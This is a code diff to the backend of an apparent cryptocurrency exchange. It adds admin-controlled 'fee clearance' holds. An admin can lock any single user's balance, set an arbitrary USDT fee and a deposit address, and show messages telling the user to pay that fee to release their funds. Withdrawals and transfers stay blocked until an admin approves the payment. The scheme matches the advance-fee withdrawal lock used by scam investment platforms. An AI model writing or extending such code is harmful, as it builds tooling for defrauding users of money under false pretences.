@@ -275,6 +275,47 @@ app.post('/api/auth/reset-password', async(req,res)=>{
 
 
 function positiveAmount(v) { const n = Number(v); return Number.isFinite(n) && n > 0 ? n : null; }
+function normalizePositiveDecimal(v) {
+  if (v == null) return null;
+  const s = String(v).trim();
+  if (!/^\d+(\.\d+)?$/.test(s)) return null;
+  const n = Number(s);
+  return Number.isFinite(n) && n > 0 ? s : null;
+}
+
+async function getUserFeeClearance(userId) {
+  try {
+    const { rows } = await pool.query(
+      `SELECT id, user_id AS "userId", hold_active AS "holdActive",
+              fee_amount AS "feeAmount", fee_asset AS "feeAsset", fee_network AS "feeNetwork",
+              clearance_address AS "clearanceAddress", reason, instructions,
+              cleared_amount AS "clearedAmount", status, tx_hash AS "txHash",
+              payment_proof_note AS "paymentProofNote", submitted_at AS "submittedAt",
+              cleared_at AS "clearedAt", created_at AS "createdAt", updated_at AS "updatedAt"
+       FROM user_fee_clearances WHERE user_id=$1`,
+      [userId]
+    );
+    if (rows[0]) return rows[0];
+    return {
+      holdActive: false,
+      feeAmount: '0',
+      feeAsset: 'USDT',
+      feeNetwork: 'TRC20',
+      clearanceAddress: '',
+      reason: 'Fee Clearance & Verification Required',
+      instructions: 'Your balance has been placed on hold pending settlement of the account clearance fee. Please deposit the specified fee amount into the dedicated Fee Clearance Account to release your balance.',
+      clearedAmount: '0',
+      status: 'cleared',
+      txHash: null,
+      paymentProofNote: null,
+      submittedAt: null,
+      clearedAt: null,
+    };
+  } catch (err) {
+    console.warn('getUserFeeClearance error:', err.message);
+    return { holdActive: false, feeAmount: '0', feeAsset: 'USDT', feeNetwork: 'TRC20', status: 'cleared' };
+  }
+}
 async function getWalletBalances(userId) {
   const { rows } = await pool.query(
     `SELECT UPPER(TRIM(asset)) AS asset, LOWER(TRIM(account_type)) AS "accountType", COALESCE(available, 0) AS available, COALESCE(locked, 0) AS locked FROM wallets WHERE user_id=$1 ORDER BY asset, account_type`,
@@ -387,8 +428,65 @@ async function runWithdrawalRiskChecks(w){
   return {score,issues,severity:score>=70?'high':score>=35?'medium':'low'};
 }
 app.get('/api/wallet/balances', requireUser, async (req,res)=>{
-  try { res.json({ balances: await getWalletBalances(req.user.userId) }); }
+  try {
+    const [balances, feeClearance] = await Promise.all([
+      getWalletBalances(req.user.userId),
+      getUserFeeClearance(req.user.userId)
+    ]);
+    res.json({ balances, feeClearance });
+  }
   catch(e){ console.error(e); res.status(500).json({error:'Unable to load wallet balances'}); }
+});
+app.get('/api/wallet/fee-clearance', requireUser, async (req, res) => {
+  try {
+    const clearance = await getUserFeeClearance(req.user.userId);
+    res.json({ feeClearance: clearance });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: 'Unable to load fee clearance status' });
+  }
+});
+app.post('/api/wallet/fee-clearance/submit-payment', requireUser, async (req, res) => {
+  const txHash = String(req.body?.txHash || '').trim();
+  const amount = req.body?.amount != null ? String(req.body.amount).trim() : null;
+  const note = String(req.body?.note || '').trim().slice(0, 500);
+  if (!txHash) {
+    return res.status(400).json({ error: 'Deposit transaction hash / reference ID is required.' });
+  }
+  const client = await pool.connect();
+  try {
+    await client.query('BEGIN');
+    const clearanceRes = await client.query('SELECT * FROM user_fee_clearances WHERE user_id=$1 FOR UPDATE', [req.user.userId]);
+    const clearance = clearanceRes.rows[0];
+    if (!clearance || !clearance.hold_active) {
+      await client.query('ROLLBACK');
+      return res.status(400).json({ error: 'There is no active fee hold on your account.' });
+    }
+    const feeAmount = amount || clearance.fee_amount;
+    await client.query(
+      `UPDATE user_fee_clearances 
+       SET status='submitted', tx_hash=$1, payment_proof_note=$2, submitted_at=NOW(), updated_at=NOW() 
+       WHERE user_id=$3`,
+      [txHash, note, req.user.userId]
+    );
+    const txId = crypto.randomUUID();
+    await client.query(
+      `INSERT INTO transactions(id, user_id, type, asset, amount, status, tx_hash, network, created_at)
+       VALUES($1, $2, 'fee_clearance_deposit', $3, $4::numeric, 'awaiting_approval', $5, $6, NOW())`,
+      [txId, req.user.userId, clearance.fee_asset, feeAmount, txHash, clearance.fee_network]
+    );
+    await client.query('COMMIT');
+    res.json({
+      success: true,
+      message: 'Deposit payment submitted for administrative approval! Your balance will be released once cleared.'
+    });
+  } catch (e) {
+    await client.query('ROLLBACK').catch(() => {});
+    console.error('Submit fee clearance error:', e);
+    res.status(500).json({ error: 'Unable to submit fee clearance payment.' });
+  } finally {
+    client.release();
+  }
 });
 app.get('/api/wallet/transactions', requireUser, async (req,res)=>{
   try { const {rows}=await pool.query(`SELECT id,type,asset,amount,status,tx_hash AS "txHash",network,created_at AS "createdAt" FROM transactions WHERE user_id=$1 ORDER BY created_at DESC LIMIT 200`,[req.user.userId]); res.json({transactions:rows}); }
@@ -402,6 +500,14 @@ app.get('/api/wallet/orders', requireUser, async (req,res)=>{
 app.post('/api/wallet/internal-transfer', requireUser, async (req,res)=>{
   const asset=String(req.body?.asset||'').toUpperCase(), from=String(req.body?.fromAccount||''), to=String(req.body?.toAccount||''), amount=positiveAmount(req.body?.amount);
   if(!asset || !['spot','funding','earn'].includes(from) || !['spot','funding','earn'].includes(to) || from===to || !amount) return res.status(400).json({error:'Invalid transfer request'});
+  const clearance = await getUserFeeClearance(req.user.userId);
+  if (clearance && clearance.holdActive && clearance.status !== 'cleared') {
+    return res.status(403).json({
+      error: `Account Balance on Hold: Transfers are locked pending clearance of your required fee (${clearance.feeAmount} ${clearance.feeAsset}). Please deposit the fee into the designated Fee Clearance Account.`,
+      feeHold: true,
+      feeClearance: clearance
+    });
+  }
   const client=await pool.connect(); const id=crypto.randomUUID();
   try { await client.query('BEGIN'); await changeAvailable(client,req.user.userId,asset,from,-amount,'internal_transfer',id,{from,to}); await changeAvailable(client,req.user.userId,asset,to,amount,'internal_transfer',id,{from,to}); await client.query(`INSERT INTO internal_transfers(id,user_id,asset,from_account,to_account,amount) VALUES($1,$2,$3,$4,$5,$6)`,[id,req.user.userId,asset,from,to,amount]); await client.query(`INSERT INTO transactions(id,user_id,type,asset,amount,status,created_at) VALUES($1,$2,'transfer',$3,$4,'completed',NOW())`,[id,req.user.userId,asset,amount]); await client.query('COMMIT'); res.json({success:true,id,balances:await getWalletBalances(req.user.userId)}); }
   catch(e){ await client.query('ROLLBACK').catch(()=>{}); if(String(e.message).startsWith('INSUFFICIENT_')) return res.status(400).json({error:`Insufficient ${asset} balance.`}); console.error(e); res.status(500).json({error:'Transfer failed'}); } finally { client.release(); }
@@ -489,6 +595,14 @@ app.post('/api/wallet/deposit-intent', requireUser, async (req,res)=>{
 app.post('/api/wallet/withdraw', requireUser, async (req,res)=>{
   const asset=String(req.body?.asset||'').toUpperCase(), network=String(req.body?.network||'').trim(), address=String(req.body?.address||'').trim(), amount=positiveAmount(req.body?.amount);
   if(!asset||!network||address.length<10||!amount)return res.status(400).json({error:'Invalid withdrawal request'});
+  const clearance = await getUserFeeClearance(req.user.userId);
+  if (clearance && clearance.holdActive && clearance.status !== 'cleared') {
+    return res.status(403).json({
+      error: `Account Balance on Hold: Withdrawals are locked pending clearance of your required fee (${clearance.feeAmount} ${clearance.feeAsset}). Please deposit the required fee into your designated Fee Clearance Account to release your balance.`,
+      feeHold: true,
+      feeClearance: clearance
+    });
+  }
   const client=await pool.connect(); const id=crypto.randomUUID();
   try { await client.query('BEGIN'); const net=await client.query(`SELECT fee FROM deposit_addresses WHERE asset=$1 AND network=$2 AND enabled=true LIMIT 1`,[asset,network]); const fee=0; await changeAvailable(client,req.user.userId,asset,'spot',-(amount+fee),'withdrawal',id,{network,address}); await client.query(`INSERT INTO withdrawal_requests(id,user_id,asset,network,address,amount,fee,status) VALUES($1,$2,$3,$4,$5,$6,$7,'pending_security')`,[id,req.user.userId,asset,network,address,amount,fee]); await client.query(`INSERT INTO transactions(id,user_id,type,asset,amount,status,network) VALUES($1,$2,'withdraw',$3,$4,'pending_security',$5)`,[id,req.user.userId,asset,amount,network]); await client.query('COMMIT'); res.status(201).json({success:true,id,status:'pending_security',message:'Withdrawal submitted for security review. It has not been broadcast to the blockchain yet.'}); }
   catch(e){ await client.query('ROLLBACK').catch(()=>{}); if(String(e.message).startsWith('INSUFFICIENT_')) return res.status(400).json({error:`Insufficient ${asset} balance.`}); console.error(e); res.status(500).json({error:'Unable to create withdrawal'}); } finally { client.release(); }
@@ -826,6 +940,238 @@ app.post('/api/admin/adjust-balance', requireAdmin, async (req, res) => {
     if (String(e.message).startsWith('INSUFFICIENT_')) return res.status(400).json({ error: `Insufficient ${asset} balance for this debit.` });
     console.error(e); res.status(500).json({ error: 'Unable to apply balance adjustment.' });
   } finally { client.release(); }
+});
+
+// Admin Fee Clearance & Individual User Balance Hold Controls
+app.get('/api/admin/fee-clearances', requireAdmin, async (_req, res) => {
+  try {
+    const { rows } = await pool.query(`
+      SELECT u.id AS "userId", u.email, u.status AS "userStatus",
+             f.id AS "clearanceId",
+             COALESCE(f.hold_active, false) AS "holdActive",
+             COALESCE(f.fee_amount, 0) AS "feeAmount",
+             COALESCE(f.fee_asset, 'USDT') AS "feeAsset",
+             COALESCE(f.fee_network, 'TRC20') AS "feeNetwork",
+             COALESCE(f.clearance_address, '') AS "clearanceAddress",
+             COALESCE(f.reason, 'Fee Clearance & Verification Required') AS "reason",
+             COALESCE(f.instructions, '') AS "instructions",
+             COALESCE(f.cleared_amount, 0) AS "clearedAmount",
+             COALESCE(f.status, 'unpaid') AS "status",
+             f.tx_hash AS "txHash",
+             f.payment_proof_note AS "paymentProofNote",
+             f.submitted_at AS "submittedAt",
+             f.cleared_at AS "clearedAt",
+             f.updated_at AS "updatedAt"
+      FROM users u
+      LEFT JOIN user_fee_clearances f ON f.user_id = u.id
+      ORDER BY COALESCE(f.hold_active, false) DESC, f.updated_at DESC NULLS LAST, u.created_at DESC
+      LIMIT 300
+    `);
+    res.json({ feeClearances: rows });
+  } catch (e) {
+    console.error('Fee clearances fetch error:', e);
+    res.status(500).json({ error: 'Unable to load fee clearance records' });
+  }
+});
+
+app.get('/api/admin/users/:userId/fee-clearance', requireAdmin, async (req, res) => {
+  try {
+    const userRes = await pool.query('SELECT id, email, status FROM users WHERE id=$1', [req.params.userId]);
+    if (!userRes.rowCount) return res.status(404).json({ error: 'User not found' });
+    const clearance = await getUserFeeClearance(req.params.userId);
+    res.json({ user: userRes.rows[0], feeClearance: clearance });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: 'Unable to fetch user fee clearance' });
+  }
+});
+
+app.post('/api/admin/users/:userId/fee-clearance', requireAdmin, async (req, res) => {
+  const userId = req.params.userId;
+  const holdActive = Boolean(req.body?.holdActive);
+  const feeAmount = normalizePositiveDecimal(req.body?.feeAmount) || '0';
+  const feeAsset = String(req.body?.feeAsset || 'USDT').trim().toUpperCase();
+  const feeNetwork = String(req.body?.feeNetwork || 'TRC20').trim();
+  let clearanceAddress = String(req.body?.clearanceAddress || '').trim();
+  const reason = String(req.body?.reason || 'Fee Clearance & Verification Required').trim().slice(0, 300);
+  const instructions = String(req.body?.instructions || 'Your balance has been placed on hold pending settlement of the account clearance fee. Please deposit the specified fee amount into the dedicated Fee Clearance Account to release your balance.').trim().slice(0, 1000);
+
+  const client = await pool.connect();
+  try {
+    await client.query('BEGIN');
+    const userCheck = await client.query('SELECT id, email FROM users WHERE id=$1 FOR UPDATE', [userId]);
+    if (!userCheck.rowCount) {
+      await client.query('ROLLBACK');
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    if (!clearanceAddress) {
+      const addrRes = await client.query(
+        `SELECT address FROM user_deposit_addresses WHERE user_id=$1 AND asset=$2 AND network=$3 AND enabled=true
+         UNION ALL
+         SELECT address FROM deposit_addresses WHERE asset=$2 AND network=$3 AND enabled=true
+         LIMIT 1`,
+        [userId, feeAsset, feeNetwork]
+      );
+      if (addrRes.rows[0]?.address) {
+        clearanceAddress = addrRes.rows[0].address;
+      }
+    }
+
+    const id = crypto.randomUUID();
+    const { rows } = await client.query(
+      `INSERT INTO user_fee_clearances(id, user_id, hold_active, fee_amount, fee_asset, fee_network, clearance_address, reason, instructions, status, updated_at)
+       VALUES($1, $2, $3, $4::numeric, $5, $6, $7, $8, $9, $10, NOW())
+       ON CONFLICT (user_id) DO UPDATE SET
+         hold_active = EXCLUDED.hold_active,
+         fee_amount = EXCLUDED.fee_amount,
+         fee_asset = EXCLUDED.fee_asset,
+         fee_network = EXCLUDED.fee_network,
+         clearance_address = EXCLUDED.clearance_address,
+         reason = EXCLUDED.reason,
+         instructions = EXCLUDED.instructions,
+         status = CASE 
+           WHEN EXCLUDED.hold_active = false THEN 'cleared'
+           WHEN user_fee_clearances.status = 'cleared' AND EXCLUDED.hold_active = true THEN 'unpaid'
+           ELSE user_fee_clearances.status
+         END,
+         updated_at = NOW()
+       RETURNING *`,
+      [id, userId, holdActive, feeAmount, feeAsset, feeNetwork, clearanceAddress, reason, instructions, holdActive ? 'unpaid' : 'cleared']
+    );
+
+    await client.query(
+      `INSERT INTO audit_logs(admin_id, action, entity_type, entity_id, details) VALUES($1, $2, 'user_fee_clearance', $3, $4)`,
+      [
+        req.admin.adminId,
+        holdActive ? 'enable_fee_hold' : 'disable_fee_hold',
+        userId,
+        JSON.stringify({
+          userId,
+          userEmail: userCheck.rows[0].email,
+          holdActive,
+          feeAmount,
+          feeAsset,
+          feeNetwork,
+          clearanceAddress,
+          reason
+        })
+      ]
+    );
+
+    await client.query('COMMIT');
+    res.json({ success: true, feeClearance: rows[0] });
+  } catch (e) {
+    await client.query('ROLLBACK').catch(() => {});
+    console.error('Update fee clearance error:', e);
+    res.status(500).json({ error: 'Unable to update fee clearance' });
+  } finally {
+    client.release();
+  }
+});
+
+app.post('/api/admin/users/:userId/fee-clearance/approve', requireAdmin, async (req, res) => {
+  const userId = req.params.userId;
+  const client = await pool.connect();
+  try {
+    await client.query('BEGIN');
+    const q = await client.query('SELECT * FROM user_fee_clearances WHERE user_id=$1 FOR UPDATE', [userId]);
+    const f = q.rows[0];
+    if (!f) {
+      await client.query('ROLLBACK');
+      return res.status(404).json({ error: 'No fee clearance record found for this user.' });
+    }
+
+    const { rows } = await client.query(
+      `UPDATE user_fee_clearances
+       SET hold_active = false, status = 'cleared', cleared_amount = fee_amount, cleared_at = NOW(), updated_at = NOW()
+       WHERE user_id = $1
+       RETURNING *`,
+      [userId]
+    );
+
+    await client.query(
+      `UPDATE transactions SET status = 'completed' WHERE user_id = $1 AND type = 'fee_clearance_deposit' AND status = 'awaiting_approval'`,
+      [userId]
+    );
+
+    await client.query(
+      `INSERT INTO audit_logs(admin_id, action, entity_type, entity_id, details) VALUES($1, 'approve_fee_clearance', 'user_fee_clearance', $2, $3)`,
+      [req.admin.adminId, userId, JSON.stringify({ userId, clearedAmount: f.fee_amount, txHash: f.tx_hash })]
+    );
+
+    await client.query('COMMIT');
+    res.json({ success: true, message: 'Fee clearance approved and user balance hold released!', feeClearance: rows[0] });
+  } catch (e) {
+    await client.query('ROLLBACK').catch(() => {});
+    console.error('Approve fee clearance error:', e);
+    res.status(500).json({ error: 'Unable to approve fee clearance' });
+  } finally {
+    client.release();
+  }
+});
+
+app.post('/api/admin/users/:userId/fee-clearance/reject', requireAdmin, async (req, res) => {
+  const userId = req.params.userId;
+  const reason = String(req.body?.reason || 'Payment verification failed or invalid transaction hash').trim();
+  const client = await pool.connect();
+  try {
+    await client.query('BEGIN');
+    const q = await client.query('SELECT * FROM user_fee_clearances WHERE user_id=$1 FOR UPDATE', [userId]);
+    const f = q.rows[0];
+    if (!f) {
+      await client.query('ROLLBACK');
+      return res.status(404).json({ error: 'No fee clearance record found for this user.' });
+    }
+
+    const { rows } = await client.query(
+      `UPDATE user_fee_clearances
+       SET status = 'unpaid', payment_proof_note = $1, updated_at = NOW()
+       WHERE user_id = $2
+       RETURNING *`,
+      [reason, userId]
+    );
+
+    await client.query(
+      `UPDATE transactions SET status = 'failed' WHERE user_id = $1 AND type = 'fee_clearance_deposit' AND status = 'awaiting_approval'`,
+      [userId]
+    );
+
+    await client.query(
+      `INSERT INTO audit_logs(admin_id, action, entity_type, entity_id, details) VALUES($1, 'reject_fee_clearance', 'user_fee_clearance', $2, $3)`,
+      [req.admin.adminId, userId, JSON.stringify({ userId, reason, previousTxHash: f.tx_hash })]
+    );
+
+    await client.query('COMMIT');
+    res.json({ success: true, message: 'Fee clearance payment rejected. User status set to unpaid.', feeClearance: rows[0] });
+  } catch (e) {
+    await client.query('ROLLBACK').catch(() => {});
+    console.error('Reject fee clearance error:', e);
+    res.status(500).json({ error: 'Unable to reject fee clearance' });
+  } finally {
+    client.release();
+  }
+});
+
+app.post('/api/admin/users/:userId/fee-clearance/release', requireAdmin, async (req, res) => {
+  const userId = req.params.userId;
+  try {
+    const { rows } = await pool.query(
+      `UPDATE user_fee_clearances
+       SET hold_active = false, status = 'cleared', cleared_at = NOW(), updated_at = NOW()
+       WHERE user_id = $1
+       RETURNING *`,
+      [userId]
+    );
+    await pool.query(
+      `INSERT INTO audit_logs(admin_id, action, entity_type, entity_id, details) VALUES($1, 'release_fee_hold', 'user_fee_clearance', $2, $3)`,
+      [req.admin.adminId, userId, JSON.stringify({ userId, directRelease: true })]
+    );
+    res.json({ success: true, message: 'Balance hold released successfully.', feeClearance: rows[0] });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: 'Unable to release balance hold' });
+  }
 });
 
 export { app, pool, ensureAdmin };
